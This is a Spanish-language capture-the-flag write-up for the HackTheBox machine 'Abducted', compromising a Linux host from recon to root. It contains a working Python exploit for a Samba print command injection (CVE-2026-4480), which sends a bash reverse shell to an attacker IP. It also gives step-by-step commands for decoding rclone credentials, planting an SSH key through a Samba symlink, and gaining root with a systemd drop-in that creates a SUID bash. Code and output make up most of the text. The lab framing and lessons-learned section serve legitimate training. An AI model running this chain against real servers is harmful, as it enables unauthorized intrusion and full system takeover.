# HackTheBox — Abducted

**Dificultad:** Medium  
**OS:** Linux (Ubuntu)  
**Fecha:** Junio 2026  
**IP:** `10.129.244.177`  
**Tags:** `SMB` `Samba` `CVE-2026-4480` `rclone` `wide-links` `polkit` `systemd` `privesc`

---

## Attack Path

```
Nmap → SMB Enum (guest printer share)
  → CVE-2026-4480: spoolss RPC %J injection → RCE como nobody
    → rclone.conf world-readable → rclone reveal → creds de scott
      → SSH como scott → user.txt
        → smb.conf: force user=marcus + wide links → symlink + smbclient
          → authorized_keys escrita como marcus → SSH como marcus
            → operators group: smbd.service.d writable (setgid)
              → polkit: reload-daemon + restart smbd sin password
                → ExecStartPre SUID bash → root.txt
```

---

## 1. Reconocimiento

### Nmap

```bash
nmap -sSVC --open -Pn 10.129.244.177
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.9
139/tcp open  netbios-ssn Samba smbd 4
445/tcp open  netbios-ssn Samba smbd 4
Service Info: OS: Linux
```

Sin servicio web. Superficie de ataque reducida a SSH y Samba.

### Shares anónimas

```bash
smbclient -L //10.129.244.177 -N
```

```
Sharename     Type    Comment
---------     ----    -------
HP-Reception  Printer Reception printer
projects      Disk    Hartley Group Project Files
transfer      Disk    Staff file transfer
IPC$          IPC     IPC Service (Hartley Group Document Services)
```

```bash
rpcclient -U "" -N 10.129.244.177 -c "srvinfo"
```

```
platform_id  : 500
os version   : 6.1
server type  : 0x809a03
```

`projects` y `transfer` rechazan acceso anónimo. `HP-Reception` acepta guests — superficie de ataque confirmada.

---

## 2. Foothold — CVE-2026-4480 (Samba Print Command Injection)

### La vulnerabilidad

CVE-2026-4480 es una inyección de comandos en el subsistema de impresión de Samba. Al finalizar un print job, Samba ejecuta el `print command` vía `system()` sustituyendo macros en el string sin sanitizar.

El macro `%J` inserta el **document name** del job tal como lo envía el cliente. La única sanitización pre-fix era reemplazar `'` por `_`, dejando intactos `|`, `;`, `&`, `<` y `>`.

Confirmado en `/etc/samba/shares.conf` post-explotación:

```ini
[HP-Reception]
    comment = Reception printer
    path = /var/spool/samba
    printable = yes
    guest ok = yes
    print command = /usr/local/bin/printaudit %J %s
    lpq command = /bin/true
    lprm command = /bin/true
```

Con `document_name = "|sh"`, el comando que Samba ejecuta es:

```
/usr/local/bin/printaudit |sh <spoolfile>
```

El spool file se pasa a `sh` como script — ejecución arbitraria de código. Backend afectado: `printing = sysv`. Fix en Samba 4.22.10, 4.23.8 y 4.24.3.

### Por qué usar spoolss RPC directamente

Enviar el job con `smbclient -c` viaja por la interfaz RAP del legacy print, que sanitiza los metacaracteres a `_` antes de que lleguen a `%J`. Hay que hablar directamente con la interfaz **spoolss RPC** mediante los Python bindings de Samba.

### Verificación OOB

Antes del payload real, confirmar ejecución con ping de vuelta:

```bash
sudo tcpdump -ni tun0 icmp and host 10.129.244.177
```

Spool body de prueba: `ping -c 3 10.10.16.21\n`. Los ICMP echo requests confirmaron ejecución unauthenticada.

### Exploit

El payload debe desacoplarse con `setsid ... &` — `EndDocPrinter` es síncrono y un shell en foreground bloquearía smbd y haría timeout al RPC.

```python
# exploit.py
#!/usr/bin/env python3
from samba.dcerpc import spoolss
from samba.param import LoadParm
from samba.credentials import Credentials

RHOST, LHOST, LPORT = "10.129.244.177", "10.10.16.21", 4444

DATA = (
    "setsid bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1' >/dev/null 2>&1 &\n"
    % (LHOST, LPORT)
).encode()

lp = LoadParm()
lp.load_default()
creds = Credentials()
creds.guess(lp)
creds.set_anonymous()

iface = spoolss.spoolss(r"ncacn_np:%s[\pipe\spoolss]" % RHOST, lp, creds)

h = iface.OpenPrinter(
    "\\\\%s\\HP-Reception" % RHOST,
    "",
    spoolss.DevmodeContainer(),
    0x00000008  # PRINTER_ACCESS_USE
)

# document_name = "|sh" → %J = "|sh"
# Samba ejecuta: /usr/local/bin/printaudit |sh <spoolfile>
i1 = spoolss.DocumentInfo1()
i1.document_name = "|sh"
i1.output_file = None
i1.datatype = "RAW"

ctr = spoolss.DocumentInfoCtr()
ctr.level = 1
ctr.info = i1

iface.StartDocPrinter(h, ctr)
iface.StartPagePrinter(h)
iface.WritePrinter(h, DATA, len(DATA))
iface.EndPagePrinter(h)
iface.EndDocPrinter(h)  # ← print command se dispara aquí
iface.ClosePrinter(h)

print("[+] job submitted")
```

```bash
nc -lvnp 4444
python3 exploit.py
# [+] job submitted
```

**Shell recibida:**

```
connect to [10.10.16.21] from (UNKNOWN) [10.129.244.177] 42468
bash: cannot set terminal process group (3278): Inappropriate ioctl for device
bash: no job control in this shell
nobody@abducted:/var/spool/samba$ id
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
```

---

## 3. nobody → scott (rclone credentials)

### Descubrir el backup config

```bash
nobody@abducted:/$ cat /opt/offsite-backup/rclone.conf
```

```ini
[offsite]
type = sftp
host = backup.hartley-group.internal
user = svc-backup
pass = HZKAxfnMj-nLm59X9gpcC2ohjQL**********
shell_type = unix
```

### Decodificar la password

rclone no cifra las passwords, solo las "ofusca" con encoding base64 reversible. La herramienta misma la decodifica:

```bash
nobody@abducted:/$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
iXz********
```

### SSH como scott

La password fue reutilizada en la cuenta de sistema `scott`:

```bash
ssh scott@10.129.244.177
# password: iXz*******

scott@abducted:~$ cat user.txt
c8****************************
```

---

## 4. scott → marcus (Samba wide links + force user)

### Revisar la configuración del share transfer

```bash
scott@abducted:~$ cat /etc/samba/shares.conf
```

```ini
[transfer]
    comment = Staff file transfer
    path = /srv/transfer
    valid users = scott
    force user = marcus
    read only = no
    wide links = yes
    browseable = yes
```

```bash
scott@abducted:~$ grep -E 'unix extensions|wide links' /etc/samba/smb.conf
    unix extensions = no
    allow insecure wide links = yes
```

**La combinación peligrosa:**
- `force user = marcus` → todas las operaciones de archivo corren como `marcus`
- `wide links = yes` → Samba sigue symlinks fuera del árbol del share
- `unix extensions = no` + `allow insecure wide links = yes` → desactiva la protección que normalmente bloquea wide links

`scott` es propietario de `/srv/transfer` en disco — puede plantar symlinks.

### Plantar el symlink y escribir la SSH key

```bash
scott@abducted:~$ ssh-keygen -q -t ed25519 -N '' -f /tmp/k

scott@abducted:~$ ln -s /home/marcus /srv/transfer/mh

scott@abducted:~$ smbclient //127.0.0.1/transfer -U 'scott%iXzvcib3SrpZ' \
    -c 'mkdir mh/.ssh; put /tmp/k.pub mh/.ssh/authorized_keys'

putting file /tmp/k.pub as \mh\.ssh\authorized_keys
```

Samba sigue `mh` → `/home/marcus` y, gracias a `force user = marcus`, el archivo se crea como propiedad de `marcus`.

### SSH como marcus

```bash
ssh -i /tmp/k marcus@10.129.244.177

marcus@abducted:~$ id
uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
```

---

## 5. marcus → root (polkit + systemd drop-in)

### Descubrir el vector

```bash
marcus@abducted:~$ ls -ld /etc/systemd/system/smbd.service.d
drwxrws--- 2 root operators 4096 Jun 23 01:21 /etc/systemd/system/smbd.service.d
```

El directorio tiene permisos `drwxrws---` con grupo `operators` — el bit `s` (setgid) indica que el directorio es **group-writable**. `marcus` pertenece a `operators`, así que puede crear archivos dentro.

Cualquier `*.conf` en `/etc/systemd/system/smbd.service.d/` se fusiona en `smbd.service` al recargar el daemon. `smbd` corre como **root** → un drop-in aquí es ejecución arbitraria como root.

### Enumerar permisos polkit

```bash
marcus@abducted:~$ for action in $(pkaction); do
    pkcheck --action-id "$action" --process $$ 2>/dev/null && echo "ALLOWED: $action"
done
```

```
ALLOWED: org.freedesktop.login1.inhibit-block-idle
ALLOWED: org.freedesktop.login1.inhibit-delay-shutdown
ALLOWED: org.freedesktop.login1.inhibit-delay-sleep
ALLOWED: org.freedesktop.login1.set-self-linger
ALLOWED: org.freedesktop.systemd1.reload-daemon
```

`org.freedesktop.systemd1.reload-daemon` → marcus puede ejecutar `systemctl daemon-reload` sin contraseña.

La regla polkit para `manage-units` es condicional: solo dispara cuando la llamada incluye `unit=smbd.service` (exactamente como lo envía `systemctl`). Por eso `systemctl restart smbd` funciona sin prompt, mientras que reiniciar cualquier otra unidad pediría contraseña de root.

### Crear el drop-in malicioso

```bash
marcus@abducted:~$ cat > /etc/systemd/system/smbd.service.d/override.conf <<'EOF'
[Service]
ExecStartPre=/bin/cp /bin/bash /tmp/.rb
ExecStartPre=/bin/chmod 4755 /tmp/.rb
EOF
```

### Aplicar y disparar

```bash
marcus@abducted:~$ systemctl daemon-reload
marcus@abducted:~$ systemctl restart smbd
```

systemd, corriendo como root, ejecuta los `ExecStartPre` y deja un bash con SUID root.

```bash
marcus@abducted:~$ ls -l /tmp/.rb
-rwsr-xr-x 1 root root 1446024 Jun 23 01:21 /tmp/.rb

marcus@abducted:~$ /tmp/.rb -p -c 'id; cat /root/root.txt'
uid=1001(marcus) gid=1002(marcus) euid=0(root) groups=1002(marcus),1000(operators)
47********************************
```

---

## Resumen de Vulnerabilidades

| # | Vulnerabilidad | Vector | Impacto |
|---|----------------|--------|---------|
| 1 | CVE-2026-4480 — Samba `%J` command injection | No autenticado, guest printer | RCE como nobody |
| 2 | `rclone.conf` world-readable con password ofuscada | Local post-explotación | Credencial de scott |
| 3 | Samba `wide links` + `force user = marcus` | Autenticado como scott | Write a home de marcus |
| 4 | `operators` group writable en `smbd.service.d` + polkit | Autenticado como marcus | RCE como root |

---

## Lecciones Aprendidas

- Un **printer share con `guest ok = yes`** es el precondition exacto de CVE-2026-4480. Si está expuesto y el Samba no está parcheado a 4.22.10+, es RCE no autenticado.
- La interfaz **spoolss RPC** (Python bindings de Samba) es necesaria para explotar la inyección — `smbclient` directo sanitiza los metacaracteres por la interfaz RAP legacy.
- `rclone` solo **ofusca** las passwords, no las cifra. Cualquier `rclone.conf` accesible es equivalente a credenciales en texto claro — siempre buscar en `/opt/`, `/etc/`, `/home/` durante post-explotación.
- La combinación `force user` + `wide links` + `allow insecure wide links` en Samba permite **escribir archivos como otro usuario** fuera del path del share.
- **polkit con reglas condicionales** puede parecer denegado en enumeración genérica (`pkcheck` sin parámetros de unidad) pero estar permitido cuando `systemctl` envía el contexto correcto.
- Directorios con **setgid + group-writable** en paths de systemd son vectores directos de privesc si el servicio corre como root.

---

## Herramientas Utilizadas

| Herramienta | Uso |
|-------------|-----|
| `nmap` | Reconocimiento de red |
| `smbclient` / `rpcclient` | Enumeración SMB y escritura de archivos |
| Python `samba.dcerpc.spoolss` | Explotación CVE-2026-4480 |
| `tcpdump` | Confirmación OOB de ejecución de código |
| `rclone reveal` | Decodificación de credenciales ofuscadas |
| `ssh-keygen` | Keypair para lateral movement |
| `pkcheck` / `pkaction` | Enumeración de permisos polkit |
| `systemctl` | Privesc vía systemd drop-in |

---

*Write-up by [yisus666-bit](https://github.com/yisus666-bit) | HackTheBox — Abducted (Medium/Linux)*
